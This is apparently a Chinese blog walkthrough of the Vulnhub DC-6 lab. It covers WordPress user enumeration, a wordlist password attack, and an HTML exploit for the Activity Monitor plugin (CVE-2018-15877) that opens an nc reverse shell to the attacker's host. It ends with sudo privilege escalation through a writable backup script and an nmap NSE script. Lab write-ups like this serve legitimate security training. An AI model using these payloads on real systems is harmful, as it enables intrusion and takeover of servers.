---
layout: mypost
title: Vulnhub靶机DC6渗透
categories: [靶机]
---

靶机下载地址：[DC6](https://www.vulnhub.com/entry/dc-6,315/)

Kali Linux 地址：192.168.43.110

![](https://z3.ax1x.com/2021/04/27/gp2juq.png)

DC6 地址：192.168.43.170

访问 web 页面

![](https://z3.ax1x.com/2021/04/27/gp2vD0.png)

本地绑定 hosts

![](https://z3.ax1x.com/2021/04/27/gp2xbV.png)

好嘛，还是 wordpress

![](https://z3.ax1x.com/2021/04/27/gpRSET.png)

dirb 扫一遍发现后台

![](https://z3.ax1x.com/2021/04/27/gpRpUU.png)

上 wpscan，版本和主题如下

![](https://z3.ax1x.com/2021/04/27/gpRPC4.png)

发现 5 个用户

![](https://z3.ax1x.com/2021/04/27/gpR95F.png)

cewl 生成字典没爆出来

![](https://z3.ax1x.com/2021/04/27/gpRkvR.png)

用作者提示的字典

![](https://z3.ax1x.com/2021/04/27/gpREK1.png)

```bash
gunzip rockyou.txt.gz
cat /usr/share/wordlists/rockyou.txt | grep k01 > passwords.txt
```

![](https://z3.ax1x.com/2021/04/27/gpRVDx.png)

得到 mark 的密码 helpdesk01

![](https://z3.ax1x.com/2021/04/27/gpRZb6.png)

一般权限

![](https://z3.ax1x.com/2021/04/27/gpRmVK.png)

可以看到用户职能

![](https://z3.ax1x.com/2021/04/27/gpRu5D.png)

从 Activity monitor 插件入手，页面唯一的文章也在提示这里

![](https://z3.ax1x.com/2021/04/27/gpRQ8H.png)

![](https://z3.ax1x.com/2021/04/27/gpRl2d.png)

把 exp 写入170.html，用 apache2 服务 （或者 python -m SimpleHTTPServer 8000）

exp 如下

```html
<html>
  <!--  Wordpress Plainview Activity Monitor RCE
        [+] Version: 20161228 and possibly prior
        [+] Description: Combine OS Commanding and CSRF to get reverse shell
        [+] Author: LydA(c)ric LEFEBVRE
        [+] CVE-ID: CVE-2018-15877
        [+] Usage: Replace 127.0.0.1 & 9999 with you ip and port to get reverse shell
        [+] Note: Many reflected XSS exists on this plugin and can be combine with this exploit as well
  -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://wordy/wp-admin/admin.php?page=plainview_activity_monitor&tab=activity_tools" method="POST" enctype="multipart/form-data">
      <input type="hidden" name="ip" value="google.fr| nc 192.168.43.110 1700 -e /bin/bash" />
      <input type="hidden" name="lookup" value="Lookup" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```

反弹 shell （或者在Activity monitor 的 Tools 页面抓包命令执行），访问之

![](https://z3.ax1x.com/2021/04/27/gpR1xA.png)

![](https://z3.ax1x.com/2021/04/27/gpR8KI.png)

成功上线，用 python 获取标准交互 shell

![](https://z3.ax1x.com/2021/04/27/gpRGrt.png)

一般权限，只得到 graham 的密码 GSo7isUM1D4

![](https://z3.ax1x.com/2021/04/27/gpRJqP.png)

切换用户发现 graham 可以以 jens 身份免密码执行 /home/jens/backups.sh 

![](https://z3.ax1x.com/2021/04/27/gpRtVf.png)

backups.sh 为打包压缩命令脚本，查看权限

![](https://z3.ax1x.com/2021/04/27/gpRNa8.png)

可以读写，修改内容

```bash
echo "/bin/bash" >>/home/jens/backups.sh
```

![](https://z3.ax1x.com/2021/04/27/gpRUIS.png)

```bash
cd /home/jens
sudo -u jens ./backups.sh
```

![](https://z3.ax1x.com/2021/04/27/gpRdPg.png)

切换用户发现 jens 可以免密码执行 /usr/bin/nmap

nmap 有执行脚本的功能，写一个执行 bash 的脚本运行

```bash
echo 'os.execute("/bin/sh")' >get_root.nse
sudo nmap --script=/home/jens/get_root.nse
```

> nse 是 nmap 插件后缀

![](https://z3.ax1x.com/2021/04/27/gpR02j.png)

提权成功

![](https://z3.ax1x.com/2021/04/27/gpRBxs.png)

Pwned！